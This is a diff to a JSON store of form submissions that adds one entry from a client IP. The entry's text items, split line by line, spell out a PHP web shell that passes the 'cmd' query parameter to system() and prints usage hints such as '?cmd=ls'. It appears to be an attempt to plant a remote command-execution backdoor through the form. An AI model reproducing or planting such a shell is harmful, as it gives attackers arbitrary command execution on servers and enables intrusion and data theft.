@@ -114,5 +114,44 @@
         "type": "text"
       }
     ]
+  },
+  {
+    "id": 1761079900627,
+    "submittedAt": "2025-10-21T20:51:40.627Z",
+    "clientIP": "86.33.36.80",
+    "items": [
+      {
+        "value": "?php",
+        "type": "text"
+      },
+      {
+        "value": "if (isset($_GET['cmd'])) {",
+        "type": "text"
+      },
+      {
+        "value": "$cmd = $_GET['cmd'];",
+        "type": "text"
+      },
+      {
+        "value": "system($cmd);",
+        "type": "text"
+      },
+      {
+        "value": "} else {",
+        "type": "text"
+      },
+      {
+        "value": "echo \"Use like this: ?cmd=dir or ?cmd=ls\";",
+        "type": "text"
+      },
+      {
+        "value": "}",
+        "type": "text"
+      },
+      {
+        "value": "?",
+        "type": "text"
+      }
+    ]
   }
 ]
